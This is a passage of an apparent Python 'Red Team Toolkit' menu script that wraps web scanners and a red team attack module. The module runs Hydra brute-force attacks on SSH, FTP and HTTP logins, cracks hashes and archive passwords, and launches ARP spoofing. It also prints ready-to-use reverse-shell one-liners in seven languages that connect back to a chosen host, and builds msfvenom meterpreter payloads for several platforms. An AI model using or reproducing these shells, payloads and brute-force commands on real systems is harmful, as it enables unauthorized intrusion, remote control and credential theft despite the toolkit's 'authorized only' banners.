        cmd = f"dalfox url https://{target} --output {report_dir / 'xss_results.txt'}"
        run_command(cmd, "XSS scanning with Dalfox", timeout=300)
    else:
        print(f"{Colors.WARNING}[!] Dalfox not installed, skipping XSS scan{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest{Colors.ENDC}")

def run_directory_fuzz(target, report_dir):
    """Run directory and file fuzzing"""
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    
    if not Path(wordlist).exists():
        wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    
    if not Path(wordlist).exists():
        print(f"{Colors.WARNING}[!] Wordlist not found, skipping directory fuzzing{Colors.ENDC}")
        return
    
    if check_tool_installed('ffuf'):
        cmd = f"ffuf -u https://{target}/FUZZ -w {wordlist} -mc 200,301,302,403 -o {report_dir / 'ffuf_results.json'} -of json -t 50"
        run_command(cmd, "Directory fuzzing with ffuf", timeout=300)
    elif check_tool_installed('gobuster'):
        cmd = f"gobuster dir -u https://{target} -w {wordlist} -o {report_dir / 'gobuster_results.txt'} -t 50 -q"
        run_command(cmd, "Directory fuzzing with gobuster", timeout=300)
    else:
        print(f"{Colors.WARNING}[!] No fuzzing tool installed{Colors.ENDC}")

def run_tech_detection(target, report_dir):
    """Detect technologies used"""
    if check_tool_installed('whatweb'):
        cmd = f"whatweb https://{target} -a 3 --log-json={report_dir / 'whatweb.json'}"
        run_command(cmd, "Technology detection", timeout=60)
    
    if check_tool_installed('wappalyzer'):
        cmd = f"wappalyzer https://{target} > {report_dir / 'wappalyzer.json'}"
        run_command(cmd, "Wappalyzer detection", timeout=60)

def run_ssl_scan(target, report_dir):
    """Scan SSL/TLS configuration"""
    if check_tool_installed('testssl'):
        cmd = f"testssl.sh --fast https://{target} > {report_dir / 'testssl_results.txt'}"
        run_command(cmd, "SSL/TLS scanning", timeout=300)
    elif check_tool_installed('sslyze'):
        cmd = f"sslyze --regular {target} > {report_dir / 'sslyze_results.txt'}"
        run_command(cmd, "SSL scanning with SSLyze", timeout=180)

def run_security_headers(target, report_dir):
    """Check security headers"""
    try:
        import urllib.request
        response = urllib.request.urlopen(f"https://{target}", timeout=10)
        headers = dict(response.headers)
        
        security_headers = {
            'Strict-Transport-Security': 'Missing',
            'X-Frame-Options': 'Missing',
            'X-Content-Type-Options': 'Missing',
            'Content-Security-Policy': 'Missing',
            'X-XSS-Protection': 'Missing',
            'Referrer-Policy': 'Missing'
        }
        
        for header in security_headers:
            if header in headers:
                security_headers[header] = headers[header]
        
        with open(report_dir / 'security_headers.json', 'w') as f:
            json.dump(security_headers, f, indent=2)
        
        print(f"{Colors.OKGREEN}[✓] Security headers analyzed{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.WARNING}[!] Could not analyze headers: {e}{Colors.ENDC}")

def generate_html_report(results, report_dir):
    """Generate HTML report"""
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Bug Hunting Report - {results['target']}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #d9534f; border-bottom: 3px solid #d9534f; padding-bottom: 10px; }}
        h2 {{ color: #337ab7; margin-top: 30px; }}
        .info {{ background: #d9edf7; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .findings {{ background: #f9f9f9; padding: 15px; border-left: 4px solid #5cb85c; margin: 10px 0; }}
        .critical {{ border-left-color: #d9534f; }}
        .warning {{ border-left-color: #f0ad4e; }}
        ul {{ line-height: 1.8; }}
        .footer {{ margin-top: 40px; text-align: center; color: #777; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🐛 Bug Hunting Report</h1>
        
        <div class="info">
            <strong>Target:</strong> {results['target']}<br>
            <strong>Scan Date:</strong> {results['timestamp']}<br>
            <strong>Report Type:</strong> Comprehensive Automated Scan
        </div>
        
        <h2>Executive Summary</h2>
        <p>This report contains the results of an automated security assessment performed on <strong>{results['target']}</strong>.</p>
        
        <h2>Findings</h2>
        <div class="findings">
            <h3>Detailed results are available in the following files:</h3>
            <ul>
                <li>Subdomains: <code>subdomains.txt</code></li>
                <li>Port Scan: <code>nmap_scan.txt</code></li>
                <li>Vulnerabilities: <code>nuclei_results.txt</code></li>
                <li>Directory Fuzzing: <code>ffuf_results.json</code> or <code>gobuster_results.txt</code></li>
                <li>Technology Detection: <code>whatweb.json</code></li>
                <li>SSL/TLS Results: <code>testssl_results.txt</code></li>
                <li>Security Headers: <code>security_headers.json</code></li>
            </ul>
        </div>
        
        <h2>Recommendations</h2>
        <div class="findings warning">
            <ul>
                <li>Review all identified vulnerabilities and prioritize remediation based on severity</li>
                <li>Implement missing security headers</li>
                <li>Ensure SSL/TLS configuration follows best practices</li>
                <li>Remove or protect sensitive files and directories</li>
                <li>Keep all software components up to date</li>
                <li>Implement Web Application Firewall (WAF)</li>
            </ul>
        </div>
        
        <div class="footer">
            <p>Generated by Red Team Toolkit | Educational Use Only</p>
            <p><strong>⚠️ This report is for authorized testing only ⚠️</strong></p>
        </div>
    </div>
</body>
</html>"""
    
    report_file = report_dir / "report.html"
    with open(report_file, 'w') as f:
        f.write(html_content)
    
    print(f"{Colors.OKGREEN}[✓] HTML report generated{Colors.ENDC}")

def reconnaissance_scan():
    """Standalone reconnaissance scan"""
    print(f"\n{Colors.HEADER}=== Reconnaissance & Subdomain Enumeration ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target domain: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    report_dir = REPORTS_DIR / f"recon_{target.replace('.', '_')}_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKBLUE}[*] Starting reconnaissance on: {target}{Colors.ENDC}\n")
    
    run_subdomain_enum(target, report_dir)
    run_port_scan(target, report_dir)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def nuclei_vulnerability_scan():
    """Standalone Nuclei scanning"""
    print(f"\n{Colors.HEADER}=== Nuclei Vulnerability Scanning ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    target = target.replace('http://', '').replace('https://', '')
    
    report_dir = REPORTS_DIR / f"nuclei_{target.replace('.', '_')}_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    run_nuclei_scan(target, report_dir)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def sql_injection_testing():
    """SQL injection testing"""
    print(f"\n{Colors.HEADER}=== SQL Injection Testing ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL (with parameter): {Colors.ENDC}").strip()
    
    if not target:
        return
    
    if not check_tool_installed('sqlmap'):
        print(f"{Colors.FAIL}[!] SQLMap not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: sudo apt install -y sqlmap{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    report_dir = REPORTS_DIR / f"sqli_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKBLUE}[*] Testing for SQL injection...{Colors.ENDC}")
    
    cmd = f"sqlmap -u '{target}' --batch --level=3 --risk=2 --output-dir={report_dir}"
    run_command(cmd, "SQLMap scan", timeout=600)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def xss_testing():
    """XSS vulnerability testing"""
    print(f"\n{Colors.HEADER}=== XSS (Cross-Site Scripting) Testing ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    report_dir = REPORTS_DIR / f"xss_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    run_xss_scan(target.replace('http://', '').replace('https://', ''), report_dir)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def directory_fuzzing():
    """Directory and file fuzzing"""
    print(f"\n{Colors.HEADER}=== Directory Fuzzing & Hidden Files ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    target = target.replace('http://', '').replace('https://', '')
    
    report_dir = REPORTS_DIR / f"fuzz_{target.replace('.', '_')}_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    run_directory_fuzz(target, report_dir)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def api_security_testing():
    """API security testing"""
    print(f"\n{Colors.HEADER}=== API Security Testing ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter API endpoint URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    print(f"\n{Colors.OKBLUE}Available API security tests:{Colors.ENDC}")
    print("1. Authentication bypass testing")
    print("2. Rate limiting tests")
    print("3. Parameter fuzzing")
    print("4. Injection testing")
    print("5. All of the above")
    
    choice = input(f"\n{Colors.WARNING}Select test: {Colors.ENDC}").strip()
    
    report_dir = REPORTS_DIR / f"api_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKBLUE}[*] Testing API security...{Colors.ENDC}")
    
    # Basic API reconnaissance
    try:
        import urllib.request
        import json
        
        # Test common HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        results = {}
        
        for method in methods:
            try:
                req = urllib.request.Request(target, method=method)
                response = urllib.request.urlopen(req, timeout=10)
                results[method] = {
                    'status': response.status,
                    'headers': dict(response.headers)
                }
                print(f"{Colors.OKGREEN}[✓] {method}: {response.status}{Colors.ENDC}")
            except Exception as e:
                results[method] = {'error': str(e)}
                print(f"{Colors.WARNING}[!] {method}: {str(e)}{Colors.ENDC}")
        
        # Save results
        with open(report_dir / 'api_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
    except Exception as e:
        print(f"{Colors.FAIL}[✗] Error: {e}{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def cms_detection():
    """CMS detection and exploit search"""
    print(f"\n{Colors.HEADER}=== CMS Detection & Exploit Search ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    target = target.replace('http://', '').replace('https://', '')
    
    print(f"\n{Colors.OKBLUE}[*] Detecting CMS...{Colors.ENDC}")
    
    # WhatWeb for technology detection
    if check_tool_installed('whatweb'):
        output = run_command(f"whatweb https://{target}", "CMS detection")
        print(f"\n{Colors.OKGREEN}Detection Results:{Colors.ENDC}")
        print(output)
    
    # CMSmap if available
    if check_tool_installed('cmsmap'):
        run_command(f"cmsmap https://{target}", "CMS vulnerability scanning", timeout=300)
    
    # WPScan for WordPress
    if check_tool_installed('wpscan'):
        run_command(f"wpscan --url https://{target} --enumerate", "WordPress scanning", timeout=300)
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def ssl_tls_scanning():
    """SSL/TLS vulnerability scanning"""
    print(f"\n{Colors.HEADER}=== SSL/TLS Vulnerability Scanning ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target domain: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    target = target.replace('http://', '').replace('https://', '')
    
    report_dir = REPORTS_DIR / f"ssl_{target.replace('.', '_')}_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    run_ssl_scan(target, report_dir)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def parameter_fuzzing():
    """Parameter discovery and fuzzing"""
    print(f"\n{Colors.HEADER}=== Parameter Fuzzing (Arjun) ==={Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        return
    
    if not check_tool_installed('arjun'):
        print(f"{Colors.FAIL}[!] Arjun not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: pip3 install arjun{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    report_dir = REPORTS_DIR / f"params_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    cmd = f"arjun -u '{target}' -o {report_dir / 'parameters.json'}"
    run_command(cmd, "Parameter discovery", timeout=300)
    
    print(f"\n{Colors.OKGREEN}[✓] Results saved to: {report_dir}{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def view_bug_reports():
    """View bug hunting reports"""
    print(f"\n{Colors.HEADER}=== Bug Hunting Reports ==={Colors.ENDC}")
    
    reports = sorted(REPORTS_DIR.glob("*/"), key=lambda x: x.stat().st_mtime, reverse=True)
    
    if not reports:
        print(f"{Colors.WARNING}[!] No reports found{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    print(f"\n{Colors.OKBLUE}Available reports:{Colors.ENDC}")
    for i, report in enumerate(reports[:20], 1):  # Show last 20
        mtime = datetime.fromtimestamp(report.stat().st_mtime).strftime('%Y-%m-%d %H:%M')
        print(f"{i}. {report.name} ({mtime})")
    
    try:
        selection = int(input(f"\n{Colors.WARNING}Select report to view (0 to cancel): {Colors.ENDC}")) - 1
        
        if selection >= 0:
            report_path = reports[selection]
            
            # Check for HTML report
            html_report = report_path / "report.html"
            if html_report.exists():
                print(f"\n{Colors.OKGREEN}[+] Opening HTML report...{Colors.ENDC}")
                os.system(f'xdg-open "{html_report}" 2>/dev/null || open "{html_report}" 2>/dev/null || start "{html_report}"')
            
            # List files
            print(f"\n{Colors.OKBLUE}Report files:{Colors.ENDC}")
            for file in sorted(report_path.glob("*")):
                size = file.stat().st_size / 1024
                print(f"  - {file.name} ({size:.2f} KB)")
            
            # Open folder
            open_folder = input(f"\n{Colors.WARNING}Open report folder? (y/n): {Colors.ENDC}").strip().lower()
            if open_folder == 'y':
                os.system(f'xdg-open "{report_path}" 2>/dev/null || open "{report_path}" 2>/dev/null || explorer "{report_path}"')
    
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

# ==================== RED TEAM ATTACKS MODULE ====================

def redteam_menu():
    """Red team attacks module main menu"""
    while True:
        print(f"\n{Colors.HEADER}{'='*75}")
        print("                    ⚔️  RED TEAM ATTACKS MODULE")
        print(f"{'='*75}{Colors.ENDC}")
        print(f"\n{Colors.FAIL}⚠️  WARNING: Use ONLY on authorized targets  ⚠️{Colors.ENDC}\n")
        print(f"""
{Colors.OKBLUE}1.{Colors.ENDC} Password Attacks (Hydra/Medusa)
{Colors.OKBLUE}2.{Colors.ENDC} Brute Force Attacks
{Colors.OKBLUE}3.{Colors.ENDC} Reverse Shell Generator
{Colors.OKBLUE}4.{Colors.ENDC} Payload Generator (msfvenom)
{Colors.OKBLUE}5.{Colors.ENDC} Exploit Database Search
{Colors.OKBLUE}6.{Colors.ENDC} Man-in-the-Middle (MitM) Tools
{Colors.OKBLUE}7.{Colors.ENDC} WiFi Attack Tools (Aircrack-ng)
{Colors.OKBLUE}8.{Colors.ENDC} Privilege Escalation Checkers
{Colors.OKBLUE}9.{Colors.ENDC} Metasploit Framework Launcher
{Colors.OKBLUE}10.{Colors.ENDC} Wordlist Generator
{Colors.OKBLUE}0.{Colors.ENDC} Back to Main Menu
        """)
        
        choice = input(f"{Colors.WARNING}Select option: {Colors.ENDC}").strip()
        
        if choice == '1':
            password_attacks()
        elif choice == '2':
            brute_force_attacks()
        elif choice == '3':
            reverse_shell_generator()
        elif choice == '4':
            payload_generator()
        elif choice == '5':
            exploit_search()
        elif choice == '6':
            mitm_tools()
        elif choice == '7':
            wifi_attacks()
        elif choice == '8':
            privesc_checkers()
        elif choice == '9':
            launch_metasploit()
        elif choice == '10':
            wordlist_generator()
        elif choice == '0':
            break
        else:
            print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

def password_attacks():
    """Password attack demonstrations"""
    print(f"\n{Colors.HEADER}=== Password Attacks ==={Colors.ENDC}")
    print(f"{Colors.FAIL}⚠️  AUTHORIZED TESTING ONLY  ⚠️{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}Available attacks:{Colors.ENDC}")
    print("1. SSH Brute Force (Hydra)")
    print("2. FTP Brute Force (Hydra)")
    print("3. HTTP Basic Auth (Hydra)")
    print("4. HTTP Form Brute Force")
    print("5. Custom Protocol Attack")
    
    choice = input(f"\n{Colors.WARNING}Select attack type: {Colors.ENDC}").strip()
    
    if not check_tool_installed('hydra'):
        print(f"{Colors.FAIL}[!] Hydra not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: sudo apt install -y hydra{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    target = input(f"{Colors.WARNING}Enter target IP/domain: {Colors.ENDC}").strip()
    username = input(f"{Colors.WARNING}Enter username (or path to user list): {Colors.ENDC}").strip()
    password = input(f"{Colors.WARNING}Enter password (or path to password list): {Colors.ENDC}").strip()
    
    if choice == '1':
        cmd = f"hydra -l {username} -P {password} ssh://{target} -t 4"
        print(f"\n{Colors.WARNING}[!] Starting SSH brute force...{Colors.ENDC}")
        run_command(cmd, "SSH brute force", timeout=600)
    
    elif choice == '2':
        cmd = f"hydra -l {username} -P {password} ftp://{target} -t 4"
        print(f"\n{Colors.WARNING}[!] Starting FTP brute force...{Colors.ENDC}")
        run_command(cmd, "FTP brute force", timeout=600)
    
    elif choice == '3':
        path = input(f"{Colors.WARNING}Enter path (e.g., /admin): {Colors.ENDC}").strip()
        cmd = f"hydra -l {username} -P {password} {target} http-get {path} -t 4"
        print(f"\n{Colors.WARNING}[!] Starting HTTP Basic Auth brute force...{Colors.ENDC}")
        run_command(cmd, "HTTP Basic Auth brute force", timeout=600)
    
    elif choice == '4':
        form_path = input(f"{Colors.WARNING}Enter form path: {Colors.ENDC}").strip()
        post_data = input(f"{Colors.WARNING}Enter POST data format (use ^USER^ and ^PASS^): {Colors.ENDC}").strip()
        failure_string = input(f"{Colors.WARNING}Enter failure string: {Colors.ENDC}").strip()
        cmd = f"hydra -l {username} -P {password} {target} http-post-form '{form_path}:{post_data}:{failure_string}' -t 4"
        print(f"\n{Colors.WARNING}[!] Starting HTTP Form brute force...{Colors.ENDC}")
        run_command(cmd, "HTTP Form brute force", timeout=600)
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def brute_force_attacks():
    """Various brute force attacks"""
    print(f"\n{Colors.HEADER}=== Brute Force Attacks ==={Colors.ENDC}")
    
    print(f"\n{Colors.OKBLUE}Brute force targets:{Colors.ENDC}")
    print("1. ZIP file password")
    print("2. RAR file password")
    print("3. PDF password")
    print("4. Hash cracking (John the Ripper)")
    print("5. Hash cracking (Hashcat)")
    
    choice = input(f"\n{Colors.WARNING}Select target: {Colors.ENDC}").strip()
    
    if choice == '1':
        if check_tool_installed('fcrackzip'):
            file_path = input(f"{Colors.WARNING}Enter ZIP file path: {Colors.ENDC}").strip()
            wordlist = input(f"{Colors.WARNING}Enter wordlist path: {Colors.ENDC}").strip()
            cmd = f"fcrackzip -u -D -p {wordlist} {file_path}"
            run_command(cmd, "ZIP password cracking", timeout=600)
        else:
            print(f"{Colors.FAIL}[!] fcrackzip not installed{Colors.ENDC}")
    
    elif choice == '4':
        if check_tool_installed('john'):
            hash_file = input(f"{Colors.WARNING}Enter hash file path: {Colors.ENDC}").strip()
            cmd = f"john {hash_file} --wordlist=/usr/share/wordlists/rockyou.txt"
            run_command(cmd, "John the Ripper cracking", timeout=600)
            print(f"\n{Colors.OKBLUE}[*] View cracked passwords:{Colors.ENDC}")
            run_command(f"john --show {hash_file}", "Show cracked passwords")
        else:
            print(f"{Colors.FAIL}[!] John the Ripper not installed{Colors.ENDC}")
    
    elif choice == '5':
        if check_tool_installed('hashcat'):
            hash_value = input(f"{Colors.WARNING}Enter hash value: {Colors.ENDC}").strip()
            hash_type = input(f"{Colors.WARNING}Enter hash type (e.g., 0 for MD5): {Colors.ENDC}").strip()
            wordlist = input(f"{Colors.WARNING}Enter wordlist path: {Colors.ENDC}").strip()
            cmd = f"hashcat -m {hash_type} '{hash_value}' {wordlist}"
            run_command(cmd, "Hashcat cracking", timeout=600)
        else:
            print(f"{Colors.FAIL}[!] Hashcat not installed{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def reverse_shell_generator():
    """Generate reverse shell payloads"""
    print(f"\n{Colors.HEADER}=== Reverse Shell Generator ==={Colors.ENDC}")
    
    lhost = input(f"\n{Colors.WARNING}Enter your IP (LHOST): {Colors.ENDC}").strip()
    lport = input(f"{Colors.WARNING}Enter port (LPORT): {Colors.ENDC}").strip() or "4444"
    
    print(f"\n{Colors.OKBLUE}Shell types:{Colors.ENDC}")
    print("1. Bash")
    print("2. Python")
    print("3. PHP")
    print("4. Netcat")
    print("5. PowerShell")
    print("6. Perl")
    print("7. Ruby")
    print("8. All")
    
    choice = input(f"\n{Colors.WARNING}Select shell type: {Colors.ENDC}").strip()
    
    shells = {}
    
    shells['bash'] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    shells['python'] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    shells['php'] = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    shells['netcat'] = f"nc -e /bin/sh {lhost} {lport}"
    shells['powershell'] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    shells['perl'] = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    shells['ruby'] = f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    
    shell_file = WORDLISTS_DIR / f"reverse_shells_{lhost}_{lport}.txt"
    
    with open(shell_file, 'w') as f:
        if choice == '8':
            for name, payload in shells.items():
                print(f"\n{Colors.OKGREEN}=== {name.upper()} ==={Colors.ENDC}")
                print(payload)
                f.write(f"# {name.upper()}\n{payload}\n\n")
        else:
            shell_types = ['bash', 'python', 'php', 'netcat', 'powershell', 'perl', 'ruby']
            if choice.isdigit() and 1 <= int(choice) <= 7:
                shell_name = shell_types[int(choice) - 1]
                print(f"\n{Colors.OKGREEN}=== {shell_name.upper()} ==={Colors.ENDC}")
                print(shells[shell_name])
                f.write(f"# {shell_name.upper()}\n{shells[shell_name]}\n")
    
    print(f"\n{Colors.OKGREEN}[✓] Shells saved to: {shell_file}{Colors.ENDC}")
    print(f"\n{Colors.OKBLUE}[*] Start listener with: nc -lvnp {lport}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def payload_generator():
    """Generate payloads with msfvenom"""
    print(f"\n{Colors.HEADER}=== Payload Generator (msfvenom) ==={Colors.ENDC}")
    
    if not check_tool_installed('msfvenom'):
        print(f"{Colors.FAIL}[!] msfvenom not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install Metasploit Framework{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    lhost = input(f"\n{Colors.WARNING}Enter LHOST (your IP): {Colors.ENDC}").strip()
    lport = input(f"{Colors.WARNING}Enter LPORT: {Colors.ENDC}").strip() or "4444"
    
    print(f"\n{Colors.OKBLUE}Payload types:{Colors.ENDC}")
    print("1. Windows EXE")
    print("2. Windows DLL")
    print("3. Linux ELF")
    print("4. PHP")
    print("5. WAR (Java)")
    print("6. Python")
    print("7. PowerShell")
    print("8. Android APK")
    
    choice = input(f"\n{Colors.WARNING}Select payload type: {Colors.ENDC}").strip()
    
    output_dir = WORDLISTS_DIR / "payloads"
    output_dir.mkdir(exist_ok=True)
    
    commands = {
        '1': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_dir}/payload.exe",
        '2': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll -o {output_dir}/payload.dll",
        '3': f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output_dir}/payload.elf",
        '4': f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output_dir}/payload.php",
        '5': f"msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f war -o {output_dir}/payload.war",
        '6': f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output_dir}/payload.py",
        '7': f"msfvenom -p windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output_dir}/payload.ps1",
        '8': f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_dir}/payload.apk"
    }
    
    if choice in commands:
        run_command(commands[choice], "Generating payload", timeout=60)
        print(f"\n{Colors.OKGREEN}[✓] Payload saved to: {output_dir}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def exploit_search():
    """Search exploit database"""
    print(f"\n{Colors.HEADER}=== Exploit Database Search ==={Colors.ENDC}")
    
    if check_tool_installed('searchsploit'):
        search_term = input(f"\n{Colors.WARNING}Enter search term: {Colors.ENDC}").strip()
        run_command(f"searchsploit {search_term}", "Searching exploits")
    else:
        print(f"{Colors.FAIL}[!] searchsploit not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: sudo apt install -y exploitdb{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def mitm_tools():
    """Man-in-the-Middle tools"""
    print(f"\n{Colors.HEADER}=== Man-in-the-Middle Tools ==={Colors.ENDC}")
    print(f"{Colors.FAIL}⚠️  AUTHORIZED NETWORK TESTING ONLY  ⚠️{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}Available tools:{Colors.ENDC}")
    print("1. Ettercap (GUI)")
    print("2. Bettercap")
    print("3. ARP Spoofing (arpspoof)")
    print("4. SSLstrip")
    
    choice = input(f"\n{Colors.WARNING}Select tool: {Colors.ENDC}").strip()
    
    if choice == '1':
        if check_tool_installed('ettercap'):
            os.system("sudo ettercap -G")
        else:
            print(f"{Colors.FAIL}[!] Ettercap not installed{Colors.ENDC}")
    
    elif choice == '2':
        if check_tool_installed('bettercap'):
            os.system("sudo bettercap")
        else:
            print(f"{Colors.FAIL}[!] Bettercap not installed{Colors.ENDC}")
    
    elif choice == '3':
        if check_tool_installed('arpspoof'):
            target_ip = input(f"{Colors.WARNING}Enter target IP: {Colors.ENDC}").strip()
            gateway_ip = input(f"{Colors.WARNING}Enter gateway IP: {Colors.ENDC}").strip()
            interface = input(f"{Colors.WARNING}Enter interface (e.g., eth0): {Colors.ENDC}").strip()
            
            print(f"\n{Colors.WARNING}[!] Starting ARP spoofing...{Colors.ENDC}")
            print(f"{Colors.FAIL}[!] Press Ctrl+C to stop{Colors.ENDC}\n")
            
            os.system(f"sudo arpspoof -i {interface} -t {target_ip} {gateway_ip}")
        else:
            print(f"{Colors.FAIL}[!] arpspoof not installed{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def wifi_attacks():
    """WiFi attack tools"""
    print(f"\n{Colors.HEADER}=== WiFi Attack Tools ==={Colors.ENDC}")
    print(f"{Colors.FAIL}⚠️  AUTHORIZED TESTING ONLY  ⚠️{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}Available tools:{Colors.ENDC}")
    print("1. Aircrack-ng Suite")
    print("2. Monitor Mode Setup")
    print("3. Capture Handshake")
